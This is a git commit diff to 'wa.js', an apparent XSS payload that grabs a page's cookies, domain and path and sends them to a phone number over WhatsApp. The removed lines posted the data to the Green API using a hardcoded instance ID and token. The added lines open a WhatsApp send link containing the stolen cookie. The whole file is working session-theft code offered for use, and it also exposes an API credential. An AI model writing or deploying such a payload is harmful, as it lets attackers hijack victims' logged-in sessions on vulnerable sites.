3ae0c58f44a0ff973331d46ecc054f93a034dfd0
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2024-02-15 07:29:56 +0100

    Update wa.js

--- wa.js
+++ wa.js
@@ -1,24 +1,15 @@
-var greenApiId = '7103905514'; // Replace with your Green API ID
-var greenApiToken = 'a73d4e98539945968bd6f1bbac660b95a3e06dcf96b24100ab'; // Replace with your Green API Token
-var defaultPhoneNumber = '18056009130@c.us'; // Replace with your default phone number
-
-function sendWhatsAppMessage(greenApiId, greenApiToken, phoneNumber) {
+function sendWhatsAppMessageViaUrl(phoneNumber) {
     var textData = 'XSS Alert in ' + document.domain +
         '\n------------------------------------------------' +
         '\n\n- URL Target -\n' + document.location.hostname + document.location.pathname +
         '\n\n- Document Cookie -\n' + document.cookie;
 
-    var url = 'https://api.green-api.com/waInstance' + greenApiId + '/sendMessage/' + greenApiToken;
-    var payload = {
-        chatId: phoneNumber,
-        text: textData,
-    };
+    var encodedMessage = encodeURIComponent(textData);
+    var url = 'https://api.whatsapp.com/send/?phone=' + phoneNumber + '&text=' + encodedMessage + '&type=phone_number';
 
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', url, true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.send(JSON.stringify(payload));
+    // Open the WhatsApp send message URL in a new tab
+    window.open(url, '_blank');
 }
 
 // Example usage:
-sendWhatsAppMessage(greenApiId, greenApiToken, defaultPhoneNumber);
+sendWhatsAppMessageViaUrl('18056009130'); // Replace with the desired phone number
